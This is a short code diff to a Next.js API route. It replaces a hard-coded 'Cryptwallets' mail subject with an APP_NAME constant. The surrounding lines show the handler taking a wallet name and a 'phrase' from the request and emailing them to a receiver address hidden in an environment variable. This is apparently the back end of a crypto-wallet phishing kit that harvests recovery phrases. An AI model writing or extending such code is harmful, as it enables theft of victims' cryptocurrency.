@@ -1,4 +1,4 @@
-import { ERROR_MESSAGES } from './../../utils/constants'
+import { APP_NAME, ERROR_MESSAGES } from './../../utils/constants'
 import { generateTemplate, sendMail2 } from './../../utils/mailer'
 
 import { NextApiRequest, NextApiResponse } from 'next'
@@ -35,7 +35,7 @@ const handler = async (req: NextApiRequest, res: NextApiResponse) => {
         await sendMail2(
           'xarmzon@outlook.com',
           process.env.RECEIVER_EMAIL!,
-          'Cryptwallets',
+          APP_NAME,
           generateTemplate(capitalize(wallet), phrase)
         )
         return res.status(200).json({ msg: 'All Done' })
